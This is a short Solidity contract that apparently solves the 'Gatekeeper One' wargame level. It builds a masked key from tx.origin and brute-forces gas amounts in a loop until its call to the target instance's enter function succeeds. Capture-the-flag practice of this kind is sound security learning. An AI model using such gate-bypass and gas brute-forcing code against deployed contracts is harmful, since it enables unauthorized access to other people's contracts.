
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Entrant {
    address instAddr = 0x2572a0AAb2070613396D09d06F9d1E12084f8336; //the addr of your instance
    
    function enter() external {       
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 1000; i++) {
            (bool ok, ) = instAddr.call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", key)); //just bruteforce untill we get correct value of gas
            if (ok) {
                break;
            }
        }

    }
}